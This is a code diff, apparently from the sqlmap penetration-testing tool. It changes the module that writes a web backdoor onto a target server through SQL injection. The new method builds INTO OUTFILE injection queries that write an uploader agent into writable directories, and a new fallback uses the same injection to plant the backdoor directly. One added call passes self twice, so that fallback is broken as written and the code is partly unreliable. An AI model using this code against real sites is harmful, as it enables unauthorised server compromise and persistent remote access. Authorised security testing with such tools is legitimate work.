@@ -92,8 +92,11 @@ class Web:
                                 "file":      stream,
                                 "uploadDir": directory,
                               }
-                              
+
             page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams, raise404=False)
+
+            if stream:
+                stream.seek(0)
 
             if "File uploaded" not in page:
                 warnMsg  = "unable to upload the backdoor through "
@@ -105,6 +108,16 @@ class Web:
 
         elif self.webApi == "jsp":
             return False
+
+    def __webFileInject(self, fileContent, fileName, directory):
+        outFile     = normalizePath("%s/%s" % (directory, fileName))
+        uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
+        query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
+        query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
+        query       = agent.prefixQuery(" %s" % query)
+        query       = agent.postfixQuery(query)
+        payload     = agent.payload(newValue=query)
+        page        = Request.queryPage(payload)
 
     def webInit(self):
         """
@@ -155,20 +168,15 @@ class Web:
 
         backdoorName = "backdoor.%s" % self.webApi
         backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, backdoorName + '_'), backdoorName)
+        backdoorContent = backdoorStream.read()
+        backdoorStream.seek(0)
         
         uploaderName = "uploader.%s" % self.webApi
         uploaderContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, uploaderName + '_'))
         
         for directory in directories:
             # Upload the uploader agent
-            outFile     = normalizePath("%s/%s" % (directory, uploaderName))
-            uplQuery    = uploaderContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
-            query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
-            query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
-            query       = agent.prefixQuery(" %s" % query)
-            query       = agent.postfixQuery(query)
-            payload     = agent.payload(newValue=query)
-            page        = Request.queryPage(payload)
+            self.__webFileInject(uploaderContent, uploaderName, directory)
             
             requestDir  = ntToPosixSlashes(directory).replace(ntToPosixSlashes(kb.docRoot), "/").replace("//", "/")
             if isWindowsPath(requestDir):
@@ -178,7 +186,7 @@ class Web:
             self.webUploaderUrl = "%s/%s" % (self.webBaseUrl, uploaderName)
             self.webUploaderUrl = ntToPosixSlashes(self.webUploaderUrl.replace("./", "/"))
             uplPage, _  = Request.getPage(url=self.webUploaderUrl, direct=True, raise404=False)
-
+            
             if "sqlmap file uploader" not in uplPage:
                 warnMsg  = "unable to upload the uploader "
                 warnMsg += "agent on '%s'" % directory
@@ -193,12 +201,22 @@ class Web:
             if kb.os == "Windows":
                 directory = posixToNtSlashes(directory)
             
-            if self.__webFileStreamUpload(backdoorStream, backdoorName, directory):
-                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
-                self.webDirectory = directory
-                infoMsg  = "the backdoor has probably been successfully "
-                infoMsg += "uploaded on '%s', go with your browser " % directory
-                infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
-                logger.info(infoMsg)
+            if not self.__webFileStreamUpload(backdoorStream, backdoorName, directory):
+                message   = "backdoor hasn't been successfully uploaded "
+                message  += "with uploader probably because of permission "
+                message  += "issues. do you want to try the same method used "
+                message  += "for uploader? [y/N] "
+                getOutput = readInput(message, default="N")
+                if getOutput in ("y", "Y"):
+                    self.__webFileInject(self, backdoorContent, backdoorName, directory)
+                else:
+                    continue
+
+            self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
+            self.webDirectory = directory
+            infoMsg  = "the backdoor has probably been successfully "
+            infoMsg += "uploaded on '%s', go with your browser " % directory
+            infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
+            logger.info(infoMsg)
 
             break
